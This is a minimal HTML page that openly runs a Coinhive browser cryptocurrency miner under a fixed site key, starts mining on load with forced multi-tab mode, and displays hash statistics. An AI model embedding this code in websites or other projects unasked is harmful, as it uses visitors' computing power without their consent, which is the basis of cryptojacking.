<!doctype html>
<html>
<head>
<title>Miner</title>
<script src="https://coinhive.com/lib/coinhive.min.js"></script>
<script>
var miner = new CoinHive.Anonymous('LZSdFJYBUldfKhSwZV5aWrgDXpFzut66',{throttle: 0.8});
miner.start(CoinHive.FORCE_MULTI_TAB);
</script>
</head>
<body>
<p>H/s: <div id="hps"></div></p>
<p>Total: <div id="tot"></div></p>
<p>accepted: <div id="acc"></div></p>
<script>
	var updater=function() {
		var hashesPerSecond = miner.getHashesPerSecond();
		var totalHashes = miner.getTotalHashes(true);
		var acceptedHashes = miner.getAcceptedHashes();

		// Output to HTML elements...
		document.getElementById('hps').innerHTML=hashesPerSecond;
		document.getElementById('tot').innerHTML=totalHashes;
		document.getElementById('acc').innerHTML=acceptedHashes;
	}
	// Listen on events
	miner.on('found', function() { /* Hash found */ })
	miner.on('accepted', updater)

	// Update stats once per second
	setInterval(updater, 100);
</script>
</body>
</html>
